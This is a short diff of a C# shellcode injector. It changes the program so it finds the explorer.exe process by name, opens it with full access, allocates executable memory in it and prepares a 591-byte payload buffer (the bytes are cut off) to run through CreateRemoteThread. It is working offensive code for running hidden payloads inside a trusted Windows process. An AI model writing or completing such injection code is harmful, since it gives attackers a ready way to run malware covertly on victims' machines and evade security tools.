@@ -19,7 +19,9 @@
             static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
             static void Main(string[] args)
             {
-                IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
+                Process[] expProc = Process.GetProcessesByName("explorer");
+                int pid = expProc[0].Id;
+                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
     
                 byte[] buf = new byte[591] {
